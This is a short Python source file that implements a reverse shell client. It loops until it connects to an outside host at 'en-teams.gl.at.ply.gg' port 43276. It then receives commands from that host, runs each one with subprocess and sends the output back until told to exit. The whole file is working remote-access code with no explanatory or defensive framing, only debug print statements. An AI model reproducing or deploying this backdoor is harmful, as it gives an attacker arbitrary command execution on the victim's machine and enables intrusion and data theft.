import socket
import subprocess
import time

def connect_to_server():
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect(("en-teams.gl.at.ply.gg", 43276))
            print("Debug: Connected to the server.")  # Debug statement
            return client
        except Exception as e:
            print(f"Debug: Connection failed: {e}, retrying in 1 second...")  # Debug statement
            time.sleep(1)

def main():
    client = connect_to_server()
    
    while True:
        try:
            # Receive command from server
            command = client.recv(4096).decode()
            print(f"Debug: Received command: '{command}'")  # Debug statement

            if command.lower() == "exit":
                print("Debug: Exiting.")  # Debug statement
                client.close()
                break

            # Execute the command and get the output
            output = subprocess.getoutput(command)
            print(f"Debug: Command output: '{output}'")  # Debug statement

            # Send the output back to the server
            client.send(output.encode())
        except (ConnectionResetError, socket.error):
            print("Debug: Connection lost, reconnecting...")  # Debug statement
            client = connect_to_server()
        except Exception as e:
            print(f"Debug: Error in client: {e}")
            break

if __name__ == "__main__":
    main()
